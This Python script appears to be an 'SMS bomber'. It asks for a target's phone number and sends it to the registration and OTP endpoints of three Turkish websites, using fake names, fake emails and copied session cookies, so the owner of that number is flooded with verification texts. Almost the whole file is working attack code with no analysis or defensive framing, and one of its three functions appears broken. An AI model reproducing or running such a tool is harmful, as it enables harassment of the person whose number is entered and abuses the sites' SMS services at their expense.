import requests
from urllib.parse import urlencode
from colorama import Style, Fore

import requests
from colorama import Style, Fore

import requests

def watsons(numara):
    try:
        url = "https://www.watsons.com.tr/medias/sys_master/images/h17/ha3/8840990392350/CKHHLogo/CKHHLogo.png"
        
        data = {
                "uid" : "ornek@gmail.com",
                "password" : "Azeki3131@",
                "passwordConfirm" : "Azeki3131@",
                "mobileNumber" : numara,
                "submit" : "True"
        }

        headers = {
            "cookie": "cookie-notification=NOT_ACCEPTED; ROUTE=.accstorefront-5b99d64b9f-ms87c; dtCookie=v_4_srv_43_sn_71D8ABB617F35C9A93430638FDF84D05_perc_100000_ol_0_mul_1_app-3A12b3aecfd0edb7b9_0; PIM-SESSION-ID=LcDDjhs3hQAondFo; wtr-001=utm_source=https://www.google.com/&utm_medium=referral; JSESSIONID=9BEF7E53A5A3579A1982D0D4A8F90C56.accstorefront-5b99d64b9f-ms87c; bm_mi=D5F16B23545BE19620B9FC4D6A77CA3E~YAAQq1CMT2AjpVCPAQAAjo5wVBfhECwquJmGYiCX4KZozeOF2wMuSgxW4wIeqtqcU9VxzsQ4XamxEp0sqlf5XkpmPplExPu2tDH0nFpVFDLmY6o95VjUggVMdXrdPi3xsRDORVaqBE0XeX59XmNhmXEarrgYUTvGAJ4p9zFjFq0v0AAF/tjas3far/CLxbgl7D17KWnFYFskkWrQsRMxSUYR3L/NorlFZIebJQIYuF8ErHa7AgCK9gnxzlx6NnZpSS0Lhf1r68WC9IFfRb41UekMPH/qPu8gjKKeZYCdF326QRZbAlzxWLetP/dRq/06W0MN84P+55n7Vg==~1; bm_sz=F9EDDBA1C3297DAFD04475F9965C7C62~YAAQq1CMT2IjpVCPAQAAjo5wVBfuiK8VMZg83g04frOnKXWICzxpeH7CtuPTubSEqlslOcu0AiudU2gp56GQ1uSZmXM0Az4vPqLenQ9sdF3qrHogkhugI4CfdwperBND4NlgdcsNLAU75F+yGpo093vEnpbaHk/G5y50cEEQFZUz/vKioFpM7iP/I6XFJI0dOvqW7prJMaOJgyr3q6yYZrXaDduvPbTCaUmbmCMWg9KGF1MEOvp5WYjTsXzADCWQycYEyYOeLhK/FeX1i7Os88QeIOaIozWhZ+97bBH88/jdp9YWSC2gZ+4ZTvDay8AA4YGvhcoT8TgAiY/hcS+YJoclBXwfwhndQnUCJ0HUnRGA/8UeTTXYYjcKg52B1s75vqVlIRrTBdF15ft8e5Yw4VyPl0nRr0Eybw+2p8Q=~3753030~3359280; _gid=GA1.3.1356687832.1715108614; _gat_UA-16071807-1=1; wtctr-cart=bf3486ba-9598-4368-9639-218a79c3902b; ak_bmsc=3093762237EF75309753E9D358882181~000000000000000000000000000000~YAAQq1CMT68jpVCPAQAAgZRwVBcED87dNzAxBCvYBtqjuwQ9wzGZMLwl8mOYHIWUlyQlE2a4FX4VEhrtUyFFxxvKSdGmPwBv0Asb4FpttpKsUCIFF4+yIra1o5lS8elOv0SoMc9dkhbpigGFp46389o6qH/4prfpIbBtFDRjHPqnc9lHvC51fQyH96+BkblUBcq7oxY2MHCpggEUgWt7FturHNfODvMt/A79Z8nBzsdLpJbnFnlr6AuLEcauPv8LNk9neTu+v0RajUt1oDaHch3gAP+UYEm9hpIA3XpxbiirMlhohPjtkmpKOA/LXuLHSpmzlb5fugRfp+M9glObxMsdzDGYbnREQJAApoH8ksAWHB0Jfe94qhctwDAGJTxsoKPoqWG+WdGCui+bG7JUeG92JAh2G/S/aDpo65E1cIxANoLEiDqnfg44hpPH7bjG2i5pAcg6TdPWbB4ZXZKlwvq//t/F0gAKY8pLBXVANcK2hvr6n1+f/oEs; _abck=0FD005BFD127F2AC1FB285EBDFD0B7E9~0~YAAQq1CMT8UjpVCPAQAAnJVwVAvkPLEELx7edQ5DYAGwKC4yYGfHVEIMt1UHMsLetfYytPb7H9k8VfEBpK8QkaeNQnrNDoDaYvgOzYkf3gy+S4pzE4mvnpxdx1U5go1Dj/0RqnQIufIwDW/PkqbmmRjDEfMCWP/HNFLO5MGdUrsQFcwPfRCeZjR8rwg0zAGKLLLoETEhvzqNcoVA1zIonB2yhjICLlqAT7L/FH4XC1x9wq3qn061k6lownQHJpUF53F4s7yqeWgOpZrnuWF3PggxicOSJ1Qmo59JLxcmKr9FdN8U8kWehlFeUBwNTWiqJtmI3GWEZA4w9w/2Y7e2tEFgqOFpdpUqqCyNwv7pgIYJdcX7NVZZjzq9qEWRpyReOYhcliJ+cz6M2Z2g80nt1pvLOuN7bQ2OVZh+K+s=~-1~-1~-1; wtr-002=No; _ga_L7C55FFTY3=GS1.1.1715108614.1.0.1715108614.60.0.0; _br_uid_2=uid%3D9138906421944%3Av%3D15.0%3Ats%3D1715108615009%3Ahc%3D1; QueueITAccepted-SDFrts345E-V3_wtctr=EventId%3Dwtctr%26QueueId%3D22df6919-c4d0-4c40-b572-f27a5dff38fe%26RedirectType%3Dsafetynet%26IssueTime%3D1715108616%26Hash%3Da9556f3a37fa48bddedfd3b942ea6b60346dac35f220bf0ef1330ec0ed8351b2; OptanonAlertBoxClosed=2024-05-07T19:03:37.788Z; OptanonConsent=isGpcEnabled%3D0%26datestamp%3DTue%2BMay%2B07%2B2024%2B22%253A03%253A37%2BGMT%252B0300%2B%2528GMT%252B03%253A00%2529%26version%3D202401.2.0%26browserGpcFlag%3D0%26isIABGlobal%3Dfalse%26hosts%3D%26genVendors%3D%26consentId%3D200f0f5f-7be6-4a0f-9f1b-690059379930%26interactionCount%3D1%26landingPath%3DNotLandingPage%26groups%3DC0001%253A1%252CC0003%253A0%252CC0009%253A0; personaclick_session_code=BrLNn4DA1l; personaclick_session_last_act=1715108618449; personaclick_device_id=oruEgzhaTU; personaclick_lazy_recommenders=true; personaclick-popup-198=showed; _ga=GA1.3.1513860270.1715108614; bm_sv=360112E36FDC3E721A75686D33EDA52F~YAAQq1CMT10ppVCPAQAA6vxwVBd9xRpMae/zIyOYbQs50NvzZjtmYBTXml5+l76C6lUNhVSwHhuotIVSRxMvv1JsfP/Oz8PU4QMIKyOVHDK6+P4ql9ByOFnpCjERg/SOplK28M1D4VZuvARCDwkazPN4Ep0m8zT3kD+fRUtobKU3a0ECZ/+GV7amPLCK0SoOcYoimi30Ikffc3MHQ5kl9drpzlW5NhFpdOicQRfVnPdp6V2do5Tt+PqL35T49wy5kko5f+E=~1",
            "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
            "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.watsons.com.tr/register",
            "sec-ch-ua": '"Opera";v="109", "Not:A-Brand";v="8", "Chromium";v="123"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "image",
            "sec-fetch-mode": "no-cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0"
        }

        response = requests.get(url,data=data ,headers=headers)

        if response.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {numara} --> watsons.com")
        else:
            return

    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {numara} --> {e}")


def akademihaverp(numara):
    try:
        url = "https://akademi.haverpharma.com.tr/otpAjax.php"

        payload = {
            "name" : "flex",
            "surname" : "marka",
            "phone": numara,
            "email" : "ornek@gmail.com",
            "password" : "Azeki3131",
            "password-check":"Azeki3131",
            "birthday" : "07-05-2000",
            "title" : "13",
            "statement" : "True",
            "perm" : "True",
            "kvkk" : "True",
            "register" : "True",
        }

        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "PHPSESSID=13f76a7c1731d50401baca5a161c38d0",
            "origin": "https://akademi.haverpharma.com.tr",
            "referer": "https://akademi.haverpharma.com.tr/kayit-ol",
            "sec-ch-ua": '"Opera";v="109", "Not:A-Brand";v="8", "Chromium";v="123"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
            "x-requested-with": "XMLHttpRequest"
        }

        response = requests.post(url, data=payload, headers=headers)

        if response.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {numara} --> akademi")
        else:
            return
    except Exception as x:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {numara} --> {x}")




def novarge(numara):
    try:
        url = "https://www.novarge.com.tr/kayit_ol"

        payload = {
            "isim": "ahmet",
            "soyisim": "flem",
            "eposta": "gmail@gmail.com",
            "telefon": numara,  # Telefon numarası doğru formatta olmalı
            "izin": "1",
            "sozlesme": "1",
            "register": "TRUE"
        }

        # Verileri URL kodlamasına uygun hale getir
        encoded_payload = urlencode(payload)

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "ci_session=f78004f8be3393fe420af9cd0cf7c5a2b3bc96f0; _fbp=fb.2.1715104748322.1953108899; cookie-policy=1; _gcl_au=1.1.1142976496.1715104748.2092276729.1715104800.1715106661",
            "Origin": "https://www.novarge.com.tr",
            "Referer": "https://www.novarge.com.tr/kayit_ol",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
            "sec-ch-ua": '"Opera";v="109", "Not:A-Brand";v="8", "Chromium";v="123"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        }

        response = requests.post(url, data=encoded_payload, headers=headers)

        if response.status_code == 200:
            if "teşekkür" in response.text.lower():
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {numara} --> novarge.com")
            elif "hata" in response.text.lower():
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {numara} --> Hata mesajı: {response.status_code}")
            else:
                print(f"{Fore.LIGHTYELLOW_EX}[?] {Style.RESET_ALL}Bilinmeyen bir yanıt alındı: {response.status_code}")
        else:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {numara} --> HTTP Durum Kodu: {response.status_code}")
    except Exception as E:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {numara} --> {E}")

numara = input("Lütfen Telefon Numarası Girin: ")
akademihaverp(numara)
novarge(numara)
watsons(numara)